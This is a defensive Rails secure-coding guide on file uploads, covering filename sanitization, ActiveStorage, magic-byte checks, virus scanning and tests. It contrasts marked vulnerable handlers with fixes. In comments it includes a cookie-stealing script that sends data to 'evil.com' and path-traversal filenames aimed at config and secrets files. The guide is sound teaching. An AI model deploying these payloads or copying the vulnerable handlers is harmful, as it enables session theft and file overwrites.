---
name: security-file-uploads
domain: security
dependencies: []
version: 1.0
rails_version: 8.1+
criticality: CRITICAL
---

# Secure File Uploads

Prevent file upload vulnerabilities by validating file types, sanitizing filenames, limiting file sizes, and using ActiveStorage for secure storage.

<when-to-use>
- Accepting ANY file uploads from users
- Implementing profile pictures or avatars
- Building document management systems
- Creating file sharing features
- Allowing image attachments in forms
- ALWAYS - File upload security is ALWAYS required
</when-to-use>

<attack-vectors>
- **Path Traversal** - `../../config/database.yml` overwrites config files
- **Malicious File Types** - `.exe`, `.php`, `.html` files containing malware
- **Content Type Spoofing** - File claims to be image but is actually script
- **Magic Bytes Bypass** - File extension doesn't match actual file type
- **Zip Bombs** - Compressed files that expand to massive sizes
- **XSS via SVG** - SVG files containing embedded JavaScript
- **HTML Injection** - HTML files served with scripts to users
- **Denial of Service** - Large files consuming disk space/memory
</attack-vectors>

<standards>
- NEVER trust user-provided filenames (path traversal risk)
- ALWAYS sanitize filenames (remove path components, special chars)
- PREFER ActiveStorage over manual file handling
- VALIDATE file type by: content type, extension, AND magic bytes
- LIMIT file sizes at application and model levels
- SCAN for viruses in production environments
- SERVE files via controller with proper headers, not from public/
- STORE files outside public directory with signed URLs
- FORCE download (Content-Disposition: attachment) for untrusted types
- USE unique filenames to prevent collisions and overwrites
</standards>

## Vulnerable Patterns

<pattern name="unsanitized-filenames">
<description>NEVER trust user-provided filenames</description>

**CRITICAL VULNERABILITY:**
```ruby
# ❌ CRITICAL - Path traversal attack
def upload_file
  filename = params[:file].original_filename
  File.open("uploads/#{filename}", "wb") do |f|
    f.write(params[:file].read)
  end
end

# Attack: filename = "../../config/database.yml"
# Result: Overwrites database configuration!

# Attack: filename = "../../../public/index.html"
# Result: Overwrites homepage with malicious content!

# Attack: filename = "../../app/views/layouts/application.html.erb"
# Result: Injects code into application layout!
```

**Why Dangerous:**
User controls file path, allowing them to write anywhere the application has permissions.
</pattern>

<pattern name="direct-public-serving">
<description>NEVER serve uploaded files directly from public/</description>

**CRITICAL VULNERABILITY:**
```ruby
# ❌ CRITICAL - XSS via uploaded HTML
def upload
  # Saves to public/uploads/
  path = Rails.root.join("public/uploads/#{params[:file].original_filename}")
  File.open(path, "wb") do |f|
    f.write(params[:file].read)
  end
end

# Attack: User uploads "hack.html" containing:
# <script>
#   // Steal cookies
#   fetch('https://evil.com/steal?cookie=' + document.cookie);
# </script>

# Accessed at: https://yourapp.com/uploads/hack.html
# Result: Script executes in your domain context, stealing user sessions!
```

**Why Dangerous:**
Files in public/ are served directly by web server with your domain's origin, allowing XSS.
</pattern>

## Secure Manual Handling

<pattern name="filename-sanitization">
<description>Sanitize filenames before use (if not using ActiveStorage)</description>

**Secure Filename Sanitization:**
```ruby
# ✅ SECURE - Remove path components and dangerous characters
def sanitize_filename(filename)
  filename = File.basename(filename).strip.gsub(/[^\w.-]/, "_")[0..255]
  filename.empty? ? "unnamed" : filename
end

# ✅ SECURE - Use unique filename to prevent collisions
def safe_upload
  safe_filename = sanitize_filename(params[:file].original_filename)
  unique_filename = "#{SecureRandom.uuid}_#{safe_filename}"
  storage_path = Rails.root.join("storage/uploads", unique_filename)

  File.open(storage_path, "wb") { |f| f.write(params[:file].read) }
  unique_filename
end
```

**Why Secure:**
- Removes path traversal attempts
- Prevents special character exploits
- Uses unique names to prevent overwrites
- Stores outside public directory
</pattern>

## ActiveStorage (Recommended)

<pattern name="activestorage-basic">
<description>Use ActiveStorage for automatic security handling</description>

**Setup:**
```bash
# Install ActiveStorage
rails active_storage:install
rails db:migrate
```

**Model:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :screenshot
  has_many_attached :documents

  validates :screenshot,
    content_type: ["image/png", "image/jpeg", "image/gif"],
    size: { less_than: 5.megabytes }

  validates :documents,
    content_type: ["application/pdf", "text/plain", "application/msword"],
    size: { less_than: 10.megabytes }
end
```

**Controller:**
```ruby
class FeedbacksController < ApplicationController
  def create
    @feedback = Feedback.new(feedback_params)
    if @feedback.save
      redirect_to @feedback, notice: "Feedback created"
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def feedback_params
    params.expect(feedback: [:content, :recipient_email, :screenshot, documents: []])
  end
end
```

**View:**
```erb
<%= form_with model: @feedback do |f| %>
  <%= f.file_field :screenshot, accept: "image/*" %>
  <%= f.file_field :documents, multiple: true, accept: ".pdf,.txt,.doc" %>
  <%= f.submit %>
<% end %>
```

**Why Secure:**
- Automatic filename sanitization
- Storage outside public directory
- Signed URLs with expiration
- Built-in virus scanning hooks
- Content type validation
</pattern>

<pattern name="content-type-validation">
<description>Validate file types by content type, extension, AND magic bytes</description>

**Comprehensive Validation:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :image
  validate :acceptable_image

  private

  def acceptable_image
    return unless image.attached?

    unless image.content_type.in?(%w[image/jpeg image/png image/gif])
      errors.add(:image, "must be a JPEG, PNG, or GIF")
    end

    unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
      errors.add(:image, "must have a valid extension")
    end

    unless valid_image_signature?
      errors.add(:image, "file signature doesn't match declared type")
    end

    if image.byte_size > 5.megabytes
      errors.add(:image, "must be less than 5MB")
    end
  end

  def valid_image_signature?
    image.open do |file|
      magic_bytes = file.read(8)
      return false unless magic_bytes
      # JPEG: FF D8 FF, PNG: 89 50 4E 47, GIF: 47 49 46 38
      magic_bytes[0..2] == "\xFF\xD8\xFF" ||
        magic_bytes[0..7] == "\x89PNG\r\n\x1A\n" ||
        magic_bytes[0..3] == "GIF8"
    end
  rescue => e
    Rails.logger.error("Image validation error: #{e.message}")
    false
  end
end
```

**Why Triple Validation:** Content-Type can be spoofed, extension can be faked (.php→.jpg), magic bytes verify actual file format.
</pattern>

<pattern name="dangerous-file-types">
<description>Force binary download for dangerous file types</description>

**Configuration:**
```ruby
# config/initializers/active_storage.rb
Rails.application.config.active_storage.content_types_to_serve_as_binary.tap do |types|
  types << "image/svg+xml"  # SVG with embedded JavaScript
  types << "text/html" << "application/xhtml+xml"  # HTML scripts
  types << "text/xml" << "application/xml"  # XML entities
  types << "application/javascript" << "text/javascript"
end

Rails.application.config.active_storage.content_types_allowed_inline = %w[
  image/png image/jpeg image/gif image/bmp image/webp application/pdf
]
```

**Why Important:** SVG/HTML files can contain JavaScript that executes when viewed, enabling XSS attacks.
</pattern>

## Virus Scanning

<pattern name="virus-scanning-production">
<description>Scan uploaded files for malware in production</description>

**Setup:** `gem "clamby"` + Install ClamAV (Ubuntu: `apt-get install clamav clamav-daemon`)

**Model Validation:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :file
  validate :file_not_infected, if: -> { file.attached? }

  private

  def file_not_infected
    return unless Rails.env.production?
    file.open do |temp_file|
      unless Clamby.safe?(temp_file.path)
        errors.add(:file, "contains malware or virus")
        Rails.logger.warn("Malware detected: user_id=#{user_id}, filename=#{file.filename}")
      end
    end
  rescue Clamby::ClambyScanError => e
    Rails.logger.error("Virus scan failed: #{e.message}")
  end
end
```

**Background Job (Async):**
```ruby
class VirusScanJob < ApplicationJob
  def perform(attachment_id)
    attachment = ActiveStorage::Attachment.find(attachment_id)
    attachment.blob.open do |file|
      attachment.purge unless Clamby.safe?(file.path)
    end
  end
end

after_create_commit { VirusScanJob.perform_later(file.id) if file.attached? }
```

**Why Critical:** Prevent viruses, ransomware, and malware from infecting users or servers.
</pattern>

## Secure File Serving

<pattern name="controller-based-serving">
<description>Serve files via controller with proper security headers</description>

**Download Controller:**
```ruby
class DownloadsController < ApplicationController
  before_action :authenticate_user!

  def show
    @feedback = Feedback.find(params[:feedback_id])
    head :forbidden and return unless can_download?(@feedback)

    @document = @feedback.documents.find(params[:id])
    send_data @document.download,
              filename: @document.filename.to_s.gsub(/[^\w.-]/, "_"),
              type: @document.content_type,
              disposition: "attachment"  # Force download, never inline
  end

  private

  def can_download?(feedback)
    feedback.user == current_user || current_user.admin?
  end
end
```

**Routes:** `resources :feedbacks { resources :downloads, only: [:show] }`

**View:**
```erb
<% @feedback.documents.each do |document| %>
  <%= link_to document.filename, feedback_download_path(@feedback, document) %>
  <span><%= number_to_human_size(document.byte_size) %></span>
<% end %>
```

**Why Secure:** Authentication + authorization enforced, Content-Disposition: attachment prevents XSS, sanitized filenames prevent header injection.
</pattern>

<pattern name="signed-urls">
<description>Use signed URLs for temporary access (ActiveStorage)</description>

**Signed URL Generation:**
```ruby
# ActiveStorage generates signed URLs automatically
<%= image_tag @feedback.screenshot %>
# Generates: /rails/active_storage/blobs/redirect/[signed_token]/filename.jpg

# Explicit expiration
url = rails_blob_url(@feedback.screenshot, expires_in: 1.hour)
```

**Configuration:**
```yaml
# config/storage.yml
amazon:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  region: us-east-1
  bucket: my-app-uploads-<%= Rails.env %>
```

```ruby
# config/environments/production.rb
config.active_storage.service = :amazon
config.active_storage.resolve_model_to_route = :rails_storage_redirect
```

**Why Secure:** URLs expire automatically, access control via Rails authentication, files not directly accessible.
</pattern>

## File Size Limits

<pattern name="size-limits">
<description>Implement multiple layers of file size protection</description>

**Application-Wide:**
```ruby
# config/application.rb
config.active_storage.max_file_size = 100.megabytes
```

**Web Server (Nginx):**
```nginx
client_max_body_size 100M;
```

**Model-Specific:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :avatar
  has_many_attached :photos

  validates :avatar, size: { less_than: 2.megabytes }
  validates :photos, size: { less_than: 5.megabytes }, limit: { max: 10 }
end
```

**Controller Early Check:**
```ruby
class FeedbacksController < ApplicationController
  before_action :check_file_size, only: [:create, :update]

  private

  def check_file_size
    if request.content_length > 50.megabytes
      render json: { error: "Total upload size too large" }, status: :payload_too_large
    end
  end
end
```

**Why Multiple Layers:** Web server rejects huge uploads early, application-wide limit prevents resource exhaustion, model-specific limits enforce business rules.
</pattern>

## Image Processing Security

<pattern name="safe-image-processing">
<description>Use ActiveStorage variants for secure image processing</description>

**Model Variants:**
```ruby
class Feedback < ApplicationRecord
  has_one_attached :image

  def thumbnail
    image.variant(resize_to_limit: [100, 100], format: :png, saver: { quality: 85 })
  end

  def medium
    image.variant(resize_to_limit: [400, 400], format: :png)
  end
end
```

**View:**
```erb
<%= image_tag @feedback.thumbnail, alt: "Feedback screenshot" %>
<%= link_to image_tag(@feedback.medium), rails_blob_path(@feedback.image, disposition: "attachment") %>
```

**Why Secure:** Variants re-encode images (stripping metadata and exploits), format conversion prevents format-specific attacks, on-demand processing limits resource usage.
</pattern>

<antipatterns>
<antipattern>
<description>Trusting user-provided filenames</description>
<reason>CRITICAL - Enables path traversal and file overwrite attacks</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def upload
  filename = params[:file].original_filename
  File.open("uploads/#{filename}", "wb") { |f| f.write(params[:file].read) }
end
# Attack: filename = "../../config/secrets.yml" - Overwrites secrets!
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Sanitize and use unique names
def upload
  safe_name = sanitize_filename(params[:file].original_filename)
  unique_name = "#{SecureRandom.uuid}_#{safe_name}"
  File.open(Rails.root.join("storage/uploads", unique_name), "wb") { |f| f.write(params[:file].read) }
end

# ✅ BETTER - Use ActiveStorage
has_one_attached :file
```
</good-example>
</antipattern>

<antipattern>
<description>Only validating content type</description>
<reason>Content-Type header is easily spoofed by attackers</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - Only checks Content-Type header
validates :image, content_type: ["image/jpeg", "image/png"]
# Attack: Upload malicious.php with Content-Type: image/jpeg
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Triple validation: content type + extension + magic bytes
def secure_image_validation
  return unless image.attached?
  unless image.content_type.in?(%w[image/jpeg image/png image/gif])
    errors.add(:image, "must be an image")
  end
  unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
    errors.add(:image, "invalid file extension")
  end
  image.open do |file|
    magic = file.read(8)
    unless magic&.start_with?("\xFF\xD8\xFF", "\x89PNG", "GIF8")
      errors.add(:image, "file signature invalid")
    end
  end
end
```
</good-example>
</antipattern>

<antipattern>
<description>Serving uploaded files from public directory</description>
<reason>Allows XSS via uploaded HTML/SVG files</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def upload
  path = Rails.root.join("public/uploads", params[:file].original_filename)
  File.open(path, "wb") { |f| f.write(params[:file].read) }
end
# File accessible at: yourapp.com/uploads/malicious.html - XSS attack!
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use ActiveStorage (stores outside public/)
has_one_attached :file

# ✅ SECURE - Serve via controller with Content-Disposition: attachment
def download
  send_data @feedback.file.download, filename: @feedback.file.filename.to_s,
            type: @feedback.file.content_type, disposition: "attachment"
end
```
</good-example>
</antipattern>
</antipatterns>

<testing>
```ruby
# test/models/feedback_test.rb
class FeedbackTest < ActiveSupport::TestCase
  test "accepts valid image" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(io: File.open("test/fixtures/files/valid.jpg"),
                          filename: "valid.jpg", content_type: "image/jpeg")
    assert feedback.valid?
    assert feedback.image.attached?
  end

  test "rejects invalid content type" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(io: File.open("test/fixtures/files/script.exe"),
                          filename: "malicious.exe", content_type: "application/x-msdownload")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be a JPEG, PNG, or GIF"
  end

  test "rejects file with spoofed magic bytes" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(io: StringIO.new("Not a real image"),
                          filename: "fake.jpg", content_type: "image/jpeg")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "file signature doesn't match"
  end

  test "rejects oversized file" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    large_file = Tempfile.new(["large", ".jpg"])
    large_file.write("x" * 6.megabytes)
    large_file.rewind
    feedback.image.attach(io: large_file, filename: "huge.jpg", content_type: "image/jpeg")
    assert_not feedback.valid?
    assert_includes feedback.errors[:image], "must be less than 5MB"
  ensure
    large_file.close && large_file.unlink
  end
end

# test/controllers/downloads_controller_test.rb
class DownloadsControllerTest < ActionDispatch::IntegrationTest
  test "requires authentication and authorization" do
    get feedback_download_path(feedbacks(:one), feedbacks(:one).documents.first)
    assert_redirected_to login_path
  end

  test "serves file with secure headers" do
    sign_in users(:user)
    feedback = users(:user).feedbacks.first
    get feedback_download_path(feedback, feedback.documents.first)
    assert_response :success
    assert_equal "attachment", response.headers["Content-Disposition"].split(";").first
  end
end
```
</testing>

<related-skills>
- security-xss - Prevent script injection
- security-csrf - CSRF protection for uploads
</related-skills>

<resources>
- [Rails Security Guide - File Uploads](https://guides.rubyonrails.org/security.html#file-uploads)
- [ActiveStorage Guide](https://guides.rubyonrails.org/active_storage_overview.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
</resources>
